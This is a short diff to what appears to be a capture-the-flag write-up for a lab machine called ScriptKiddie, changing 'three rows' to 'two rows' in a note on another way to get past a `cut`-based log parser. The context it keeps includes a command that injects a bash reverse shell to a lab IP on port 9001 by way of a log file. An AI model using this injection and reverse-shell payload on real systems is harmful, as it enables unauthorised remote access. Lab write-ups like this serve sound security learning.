@@ -28,7 +28,7 @@ That's the box!
 
 ## Notes on Alternative Methods
 
-An easier way of 'bypassing' the `cut` command (courtesy of ippsec) was just to match the correct format of the log file, by inserting three rows of arbitrary data before the command:
+An easier way of 'bypassing' the `cut` command (courtesy of ippsec) was just to match the correct format of the log file, by inserting two rows of arbitrary data before the command:
 
 ```bash
 kid@scriptkiddie:~/logs$ echo 'whatever whatever ;/bin/bash -c "bash -i >& /dev/tcp/10.10.16.211/9001 0>&1"' >> hackers
